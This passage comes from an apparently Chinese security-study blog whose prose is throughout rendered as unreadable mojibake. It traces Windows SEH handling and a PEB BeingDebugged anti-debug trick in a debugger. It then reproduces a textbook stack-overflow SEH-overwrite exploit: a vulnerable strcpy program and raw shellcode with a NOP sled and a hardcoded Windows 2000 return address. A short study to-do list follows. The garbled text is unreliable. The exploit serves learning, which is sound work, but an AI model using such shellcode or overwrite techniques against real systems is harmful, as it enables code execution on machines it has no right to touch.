;segSS</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­eipæŒ‡å‘0x401019,è¿™è¿˜æ˜¯å‘ç”Ÿå†…å­˜å¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
<h4 id="myhandler0x40105a">myHandler@0x40105A</h4>
<p>åˆ†æå®Œäº†å‡½æ•°ä»¥åŠè¿”å›åœ°å€,ç°åœ¨å°†ç„¦ç‚¹æ”¾åˆ°è¯¥å¼‚å¸¸å¤„ç†å‡½æ•°èº«ä¸Š</p>
<p>æ­¤æ—¶çš„å †æ ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0019F320   77B08BF2  è¿”å›åˆ° ntdll.77B08BF2	;è¿”å›åœ°å€</span><br><span class="line">0019F324   0019F420	;ç¬¬ä¸€ä¸ªå‚æ•°,pRecord</span><br><span class="line">0019F328   0019FF28	;ç¬¬äºŒä¸ªå‚æ•°,pFrame</span><br><span class="line">0019F32C   0019F470	;ç¬¬ä¸‰ä¸ªå‚æ•°,pContext</span><br><span class="line">0019F330   0019F3AC  UNICODE &quot;48&quot;;ç¬¬å››ä¸ªå‚æ•°,pValue</span><br></pre></td></tr></table></figure>
<h5 id="æŠŠcontextæ”¾åˆ°esiä¸Š">æŠŠcontextæ”¾åˆ°esiä¸Š</h5>
<p>ç¬¬ä¸€æ¡æŒ‡ä»¤</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151509557.png"
alt="image-20220924151509557" />
<figcaption aria-hidden="true">image-20220924151509557</figcaption>
</figure>
<p>esp+0xCæ­¤æ—¶æŒ‡å‘ç¬¬ä¸‰ä¸ªå‚æ•°,å³pContext</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151452776.png"
alt="image-20220924151452776" />
<figcaption aria-hidden="true">image-20220924151452776</figcaption>
</figure>
<p>è¿™é‡Œè§£å¼•ç”¨äº†ä¸€ä¸‹,å°±æŠŠContextçš„åŸºåœ°å€æ”¾åˆ°esiä¸Šäº†</p>
<h5 id="å°†pebæ”¾åˆ°eaxä¸Š">å°†PEBæ”¾åˆ°eaxä¸Š</h5>
<p>fsé€‰æ‹©å­æŒ‡å‘TEBçš„æè¿°ç¬¦,TEB+0x30æŒ‡å‘PEB</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151603919.png"
alt="image-20220924151603919" />
<figcaption aria-hidden="true">image-20220924151603919</figcaption>
</figure>
<p>å°†TEBçš„åŸºåœ°å€æ”¾åˆ°äº†eaxä¸Š</p>
<h5 id="æ£€æµ‹æ˜¯å¦beingdebugged">æ£€æµ‹æ˜¯å¦beingdebugged</h5>
<p>ç¬¬ä¸‰æ¡æŒ‡ä»¤,å–äº†PEB+0x2çš„ä¸€ä¸ªå­—èŠ‚çš„å€¼,å’Œ1è¿›è¡Œæ¯”è¾ƒ,</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152038006.png"
alt="image-20220924152038006" />
<figcaption aria-hidden="true">image-20220924152038006</figcaption>
</figure>
<p>PEB+0x2å­˜æ”¾çš„å°±æ˜¯BeingDebugged,å¦‚æœæ­£åœ¨è¢«è°ƒè¯•,ä¸€èˆ¬è¯¥å€¼ä¼šç½®1,</p>
<p>å¦‚æœè¯¥å€¼ä¸º1åˆ™å’Œ1çš„å·®å°±æ˜¯0,ZFå°±ç½®1</p>
<p>å¦åˆ™å¦‚æœè¯¥å€¼ä¸º0åˆ™å’Œ1çš„å·®ä¸ä¸º0,ZFç½®0</p>
<h5 id="jnz-0x00401076">jnz 0x00401076</h5>
<p>å®é™…è°ƒè¯•çš„æ—¶å€™,åˆšæ‰çš„è®¡ç®—ç»“æœä¸ä¸º0,å³ZF=1,jnzè·³è½¬</p>
<blockquote>
<p>è¯´ä¹Ÿå¥‡æ€ª,ä½¿ç”¨odè°ƒè¯•è¿è¡Œçš„,ä¸ºå•¥è¿™é‡Œæ²¡æœ‰æ£€æµ‹å‡ºè°ƒè¯•å™¨å‘¢?</p>
<p>odè°ƒè¯•è¿è¡Œæ—¶ä¸ä¼šæ£€æµ‹å‡ºè°ƒè¯•å™¨,ä½†æ˜¯x32dbgè°ƒè¯•è¿è¡Œå°±ä¼šæ£€æµ‹å‡ºè°ƒè¯•å™¨</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152418482.png"
alt="image-20220924152418482" />
<figcaption aria-hidden="true">image-20220924152418482</figcaption>
</figure>
<h5 id="ä¿®æ”¹context.eip">ä¿®æ”¹context.Eip</h5>
<p>æœ¬å‡½æ•°ä¸€å¼€å§‹å°±å°†contextçš„åŸºåœ°å€æ”¾åˆ°äº†esiä¸Š,ç°åœ¨å°†0x401039æ”¾åˆ°[esi+0xB8]è¿™ä¸ªåœ°æ–¹,ä¹Ÿå°±æ˜¯context+0xB8=Eip</p>
<p>è¿™æ„å‘³ç€,æœ¬sehèŠ‚ç‚¹çš„å¼‚å¸¸å¤„ç†å‡½æ•°,å°†contextä¸Šä¸‹æ–‡ä¸­çš„eip,æ ¹æ®å½“å‰æ˜¯å¦è¢«è°ƒè¯•,ä»äº‹æ•…ç°åœº,æ”¹åˆ°äº†å…¶ä»–æ²¡æœ‰äº‹æ•…çš„å‡½æ•°ä¸­.è¿™ä¹Ÿå°±æ˜¯è¯¥sehèŠ‚ç‚¹çš„å¼‚å¸¸å¤„ç†ç­–ç•¥</p>
<p>å½“æœ¬æ¬¡å¼‚å¸¸å¤„ç†ç»“æŸä¹‹å,æ§åˆ¶å°†ä¼šäº¤ç»™0x401039</p>
<blockquote>
<p>0x401039å¤„çš„å‡½æ•°å¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401039 loc_401039:                             ; DATA XREF: .text:loc_401076â†“o</span><br><span class="line">.text:00401039                 push    0               ; uType</span><br><span class="line">.text:0040103B                 push    offset Caption  ; &quot;ReverseCore&quot;</span><br><span class="line">.text:00401040                 push    offset aHello   ; &quot;Hello :)&quot;</span><br><span class="line">.text:00401045                 push    0               ; hWnd</span><br><span class="line">.text:00401047                 call    ds:MessageBoxA</span><br><span class="line">.text:0040104D</span><br><span class="line">.text:0040104D loc_40104D:                             ; CODE XREF: _main+37â†‘j</span><br><span class="line">.text:0040104D                 pop     large dword ptr fs:0</span><br><span class="line">.text:00401054                 add     esp, 4</span><br><span class="line">.text:00401057                 retn</span><br><span class="line">.text:00401057 _main           endp</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå¼¹çª—</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png"
alt="image-20220924153224967" />
<figcaption aria-hidden="true">image-20220924153224967</figcaption>
</figure>
<p>ç„¶åæŒ‡ä»¤<code>pop     large dword ptr fs:0</code>å°±æŠŠè¿™ä¸ªç¬¬ä¸€ä¸ªsehèŠ‚ç‚¹ç»™æ‰¬äº†,ç•™ä½œåè¯</p>
</blockquote>
<h5 id="è¿”å›">è¿”å›</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152852356.png"
alt="image-20220924152852356" />
<figcaption aria-hidden="true">image-20220924152852356</figcaption>
</figure>
<p>åœ¨ä¿®æ”¹å®Œcontext.Eipä¹‹å,å‡½æ•°å°¾å£°å°†eaxç½®å°±è¿”å›äº†</p>
<h3 id="åˆ é™¤sehèŠ‚ç‚¹">åˆ é™¤sehèŠ‚ç‚¹</h3>
<p>ç”±äºå¼‚å¸¸å¤„ç†å‡½æ•°ä¸­å°†context.eipæ”¹æˆäº†0x401039,åœ¨è¯¥å‡½æ•°ä¸Šä¸‹æ–­ç‚¹,ç„¶åCtrl+F8è‡ªåŠ¨æ­¥è¿‡,ç›´åˆ°æ‰§è¡Œåˆ°æ–­ç‚¹ä½ç½®</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153704246.png"
alt="image-20220924153704246" />
<figcaption aria-hidden="true">image-20220924153704246</figcaption>
</figure>
<p>è¿™é‡Œä¼šé¦–å…ˆå¼¹çª—</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png"
alt="image-20220924153224967" />
<figcaption aria-hidden="true">image-20220924153224967</figcaption>
</figure>
<p>ç„¶å</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154538315.png"
alt="image-20220924154538315" />
<figcaption aria-hidden="true">image-20220924154538315</figcaption>
</figure>
<p>è¿™æ¡æŒ‡ä»¤å¹²äº†å•¥å‘¢?</p>
<p>fs:0å…ˆå‰åˆ†æè¿‡,æŒ‡å‘çš„æ˜¯sehé“¾çš„é™„åŠ å¤´èŠ‚ç‚¹,ç°åœ¨å°†æ ˆé¡¶å¼¹ç»™sehé“¾çš„é™„åŠ å¤´èŠ‚ç‚¹,æ ˆé¡¶æ˜¯è°å‘¢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154743820.png"
alt="image-20220924154743820" />
<figcaption aria-hidden="true">image-20220924154743820</figcaption>
</figure>
<p>æŒ‡å‘ä¸‹ä¸€ä¸ªSEHè®°å½•çš„æŒ‡é’ˆ,å°†è¿™ä¸ªæŒ‡é’ˆçš„å€¼,å³ä¸‹ä¸€ä¸ªsehèŠ‚ç‚¹çš„åœ°å€,æ”¾åˆ°sehé“¾çš„é™„åŠ å¤´èŠ‚ç‚¹ExceptionListä¸Š,æ°å¥½å°±æŠŠmainä¸€å¼€å§‹æ³¨å†Œçš„sehèŠ‚ç‚¹æ‰¬äº†</p>
<p>ä¸ºå•¥è¿™ä¹ˆå·§æ ˆé¡¶æ­¤æ—¶å°±æ˜¯ä¸‹ä¸€ä¸ªsehèŠ‚ç‚¹çš„æŒ‡é’ˆå‘¢?</p>
<p>å› ä¸ºå †æ ˆå¹³è¡¡.0x401039æ˜¯åœ¨mainå‡½æ•°ä¸­çš„,å½“æ§åˆ¶è½¬ç§»åˆ°0x401039æ—¶ç›¸å½“äºåœ¨mainä¸­æ‰§è¡Œ,æ­¤æ—¶çš„æ ˆé¡¶å°±æ˜¯mainåˆšæ³¨å†Œå®ŒsehèŠ‚ç‚¹çš„çŠ¶æ€</p>
<h3
id="è¿”å›åˆ°___tmaincrtstartup">è¿”å›åˆ°<code>___tmainCRTStartup</code></h3>
<p>åœ¨<code>0x401039</code>å‡½æ•°retnä¹‹å‰,æ ˆé¡¶ä¸Šå­˜æ”¾çš„æ˜¯<code>0x4011C2</code>,å°†è¦ä½œä¸ºè¿”å›åœ°å€äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155304450.png"
alt="image-20220924155304450" />
<figcaption aria-hidden="true">image-20220924155304450</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155235397.png"
alt="image-20220924155235397" />
<figcaption aria-hidden="true">image-20220924155235397</figcaption>
</figure>
<p>è¿™æ˜¯è¦è¿”å›åˆ°å“ªé‡Œå»å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:004011AB                 mov     dword_40AF88, eax</span><br><span class="line">.text:004011B0                 push    eax             ; envp</span><br><span class="line">.text:004011B1                 push    argv            ; argv</span><br><span class="line">.text:004011B7                 push    argc            ; argc</span><br><span class="line">.text:004011BD                 call    _main           ; å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€å‹æ ˆ</span><br><span class="line">.text:004011C2                 add     esp, 0Ch</span><br><span class="line">.text:004011C5                 mov     [ebp+var_20], eax</span><br><span class="line">.text:004011C8                 cmp     [ebp+var_1C], 0</span><br></pre></td></tr></table></figure>
<p>ä¸€çœ¼é¡¶é’ˆ,åŸæ¥æ˜¯è¿”å›åˆ°<code>___tmainCRTStartup</code>äº†</p>
<h2 id="æ ˆæº¢å‡ºä¿®æ”¹sehå‡½æ•°æŒ‡é’ˆ">æ ˆæº¢å‡ºä¿®æ”¹sehå‡½æ•°æŒ‡é’ˆ</h2>
<p>SEHèŠ‚ç‚¹éƒ½æ˜¯åœ¨æ ˆå¸§ä¸­çš„,ç¼“å†²åŒºæº¢å‡ºå¯ä»¥ä¿®æ”¹SEHèŠ‚ç‚¹ä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€,æ”¹æˆshellcode</p>
<p>ä¹¦ä¸Šç»™å‡ºçš„æœ‰æ¼æ´çš„ä¾‹å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">	<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	_try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf, input); <span class="comment">// overrun the stack</span></span><br><span class="line">		zero = <span class="number">4</span> / zero;	<span class="comment">// generate an exception</span></span><br><span class="line">	&#125;</span><br><span class="line">	_except(MyExceptionhandler()) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨windows 2000ä¸Šç›´æ¥è¿è¡Œ,ç”±äºtestå‡½æ•°ä¸­æœ‰ä¸€ä¸ªint
3ä¸­æ–­,ç¨‹åºä¼šåœ¨æ­¤æŠ¥é”™ç„¶åå¯åŠ¨è°ƒè¯•</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924200524109.png"
alt="image-20220924200524109" />
<figcaption aria-hidden="true">image-20220924200524109</figcaption>
</figure>
<p>åœ¨int 3ä¹‹å‰,0x40106Båˆ°0x40107Cä½ç½®å·²ç»æ³¨å†Œè¿‡sehèŠ‚ç‚¹</p>
<p>æ€ä¹ˆæ³¨å†Œçš„?</p>
<p>å°†åŸæ¥çš„é™„åŠ å¤´èŠ‚ç‚¹ä¸­å­˜å‚¨çš„ç¬¬ä¸€ä¸ªsehèŠ‚ç‚¹çš„åœ°å€ä½œä¸ºå½“å‰èŠ‚ç‚¹çš„åç»§æŒ‡é’ˆå€¼,å½“å‰èŠ‚ç‚¹çš„å¼‚å¸¸å¤„ç†å‡½æ•°æ³¨å†Œä¸º0x401518</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201147624.png"
alt="image-20220924201147624" />
<figcaption aria-hidden="true">image-20220924201147624</figcaption>
</figure>
<p>å¥‡æ€ªçš„æ˜¯,è¿™ä¸ª0x401518ä¹Ÿæ˜¯åŸæ¥çš„ç¬¬ä¸€ä¸ªsehèŠ‚ç‚¹çš„æ³¨å†Œå¼‚å¸¸å¤„ç†å‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201233090.png"
alt="image-20220924201233090" />
<figcaption aria-hidden="true">image-20220924201233090</figcaption>
</figure>
<p>ä¸¤ä¸ªsehèŠ‚ç‚¹æŒ‡å‘äº†åŒä¸€å¼‚å¸¸å¤„ç†å‡½æ•°</p>
<p>åœ¨æ ˆå¸§è§†å›¾ä¸Š</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201413301.png"
alt="image-20220924201413301" />
<figcaption aria-hidden="true">image-20220924201413301</figcaption>
</figure>
<p>æ–°æ³¨å†Œçš„sehèŠ‚ç‚¹çš„å¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆåœ¨EBP-0xCä½ç½®</p>
<p>ä¸‹é¢è¦è°ƒç”¨strcpyå‡½æ•°äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201631140.png"
alt="image-20220924201631140" />
<figcaption aria-hidden="true">image-20220924201631140</figcaption>
</figure>
<p>é¦–å…ˆå°†ebp+8ä½ç½®çš„æºä¸²æŒ‡é’ˆå‹æ ˆä½œä¸ºstrcpyçš„ç¬¬äºŒä¸ªå‚æ•°</p>
<p>ç„¶åå°†ebp-0xe0ä½ç½®çš„ç›®æ ‡ç¼“å†²åŒºå‹æ ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>ç„¶åè°ƒç”¨strcpy@0x401330,è°ƒç”¨å®Œåæ ˆå¸§çš„çŠ¶æ€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201848804.png"
alt="image-20220924201848804" />
<figcaption aria-hidden="true">image-20220924201848804</figcaption>
</figure>
<p>ç¼“å†²åŒºå·²ç»é¡¶åˆ°äº†ebp-0x18,[ebp-0x18]æ­£å¥½æ˜¯'\0'</p>
<p>å†è¾“å…¥12ä¸ªå­—èŠ‚çš„å¡«å……å°±åˆ°äº†sehèŠ‚ç‚¹å¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆçš„å®¶é—¨å£äº†,ç„¶åå¾€è¿™é‡Œå†™å…¥å››ä¸ªå­—èŠ‚çš„shellcodeçš„åœ°å€</p>
<p>å› æ­¤è¿™ä¸ªç¼“å†²åŒºå¯ä»¥å†™212å­—èŠ‚çš„å¡«å……+3å­—èŠ‚çš„shellcodeåœ°å€,å‰©ä¸‹ä¸€ä¸ªå­—èŠ‚æ­£å¥½æ˜¯'\0'å¡«åˆ°åœ°å€çš„é«˜ä½</p>
<p>ä¸‹é¢å°±æ˜¯shellcodeçš„æ„é€ äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]= </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> </span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> </span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> </span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> </span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> </span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> </span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> </span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x94\xFE\x12&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>å‰é¢çš„å­—èŠ‚éƒ½å¡«å……æˆ0x90å³nopæŒ‡ä»¤,ä¸€æ˜¯ä¸ºäº†å……å½“pad,äºŒæ˜¯ä¸ºäº†å¢åŠ å‘½ä¸­ç‡,åªè¦æ˜¯æ§åˆ¶è°ƒåˆ°è¿™äº›nopæŒ‡ä»¤ä¸­,å°±ä¼šé¡ºåºæ‰§è¡Œåˆ°shellcode</p>
<p>æœ€åä¸‰ä¸ªå­—èŠ‚æ˜¯0x12FE94,è€Œshellcodeçš„åŸºåœ°å€å°±æ˜¯0x12FE94,ä¹Ÿå°±æ˜¯è¯´å°†shellcodeçš„åŸºåœ°å€æº¢å‡ºåˆ°äº†sehèŠ‚ç‚¹ä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆä¸Šäº†,</p>
<p>å°±ç®—æ˜¯å†™0x12FE95,0x12FE96ç­‰ç­‰ä¹Ÿéƒ½å¯ä»¥,nopå·²ç»æŠŠé¶é˜”çš„å¾ˆå¤§äº†</p>
<p>ç„¶åé™¤ä»¥0å¼‚å¸¸,è€Œåˆšæ‰è¢«æº¢å‡ºçš„sehèŠ‚ç‚¹åˆæ°å¥½åœ¨sehé“¾ä¸Šé¦–å½“å…¶å†²</p>
<p>å› æ­¤shellcodeå°±è¢«å½“ä½œå¼‚å¸¸å¤„ç†å‡½æ•°è°ƒç”¨äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924210055100.png"
alt="image-20220924210055100" />
<figcaption aria-hidden="true">image-20220924210055100</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/24/todolist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/24/todolist/" class="post-title-link" itemprop="url">ToDoList</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-24 00:06:00 / Modified: 00:04:56" itemprop="dateCreated datePublished" datetime="2022-09-24T00:06:00+08:00">2022-09-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="todolist">ToDoList</h1>
<p><del>2022.9.9åˆ°è¾¾å‰çº¿çš„ç¬¬äºŒå¤©,manimå·²ç»çœ‹æ¶å¿ƒäº†,æ•´ç†ä¸€ä¸‹æ€è·¯</del></p>
<p>2022.9.23åˆ°è¾¾å‰çº¿åŠä¸ªæœˆ,manimåŸºæœ¬æ”¾å¼ƒ,æ°´å¤ªæ·±,æ•´ç†ä¸€ä¸‹æ€è·¯</p>
<h2 id="todolist-on-9.23">ToDoList on 9.23</h2>
<h3 id="windows-äºŒè¿›åˆ¶">windows äºŒè¿›åˆ¶</h3>
<p>è¿™ä¸¤ä¸ªæ˜ŸæœŸå†…çš„è¿›å±•ä¸»è¦åœ¨&lt;&lt;0Dayå®‰å…¨ è½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯&gt;&gt;</p>
<p>&lt;&lt;0Dayå®‰å…¨ è½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯&gt;&gt;åŸºæœ¬çœ‹å®Œå‰6ç« ,ç•™ä¸€ä¸ª6.1
windows
SEHæœºåˆ¶æ²¡çœ‹æ˜ç™½,6.1,11,14ç« éƒ½æ˜¯SEHç›¸å…³å†…å®¹,çœ‹ä¸å¤§åŠ¨äº†.è½¬åˆ°&lt;<æ ¸å¿ƒåŸç†>&gt;ç¬¬48ç« SEH,åšå®éªŒçœ‹çœ‹.</p>
<p>å‰ä¸¤å¤©åšæ¢¦ç»™ç¨‹åºæ‰“äº†ä¸€é’ˆ(ç‰©ç†ä¸Šç”¨é’ˆç®¡å­æœå†…å­˜æ¡å­ä¸Šæ‰äº†ä¸€é’ˆ),ç„¶åç¨‹åºå°±æœ‰å³é”®èœå•äº†,ç»“æœè¿™ä¸ªçš„å®ç°å°±çœŸçš„åœ¨&lt;<åŠ å¯†ä¸è§£å¯†>&gt;ä¸­æ‰¾åˆ°äº†,å·²åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</p>
<p>å…¥å£ç‚¹çš„é€†å‘åˆ†æå¥½æ—©ä¹‹å‰å°±åƒçœ‹äº†,åˆ°ç°åœ¨ä¸€ç›´æ²¡çœ‹,è¿˜æœ‰å°±æ˜¯C++å…¨å±€å¯¹è±¡æ˜¯æ€ä¹ˆåˆå§‹åŒ–çš„,ä¸»è¦ä¾æ®æ˜¯&lt;<è‡ªæˆ‘ä¿®å…»>&gt;
ç¬¬11ç« </p>
<h3 id="ida">ida</h3>
<p>éœ€è¦å®Œå–„ä¸€ä¸‹idaçš„ç”¨æ³•,ç›®å‰å¯ä»¥æƒ³åˆ°çš„æ˜¯è¯†åˆ«å‡½æ•°,ç»“æ„ä½“.</p>
<p>ä¸»è¦ä¾æ®æ˜¯IDAæƒå¨æŒ‡å—,ä¹‹å‰åªçœ‹å®Œå‰10ç« ,ä»¥åéœ€è¦çœ‹çš„æ˜¯ç¬¬å…«ç« ç»“æ„ç±»å‹,ä»¥åŠç¬¬11ç« ä¹‹å</p>
<h3 id="è®¡ç½‘">è®¡ç½‘</h3>
<p>ä»€ä¹ˆå·®é”™æ§åˆ¶éƒ½æ‘†çƒ‚æ²¡çœ‹,è¯¥å­¦é“¾è·¯å±‚äº†,å’Œä¹‹å‰çš„å·®é”™æ§åˆ¶å…³ç³»å¥½åƒä¸æ˜¯å¾ˆå¤§.</p>
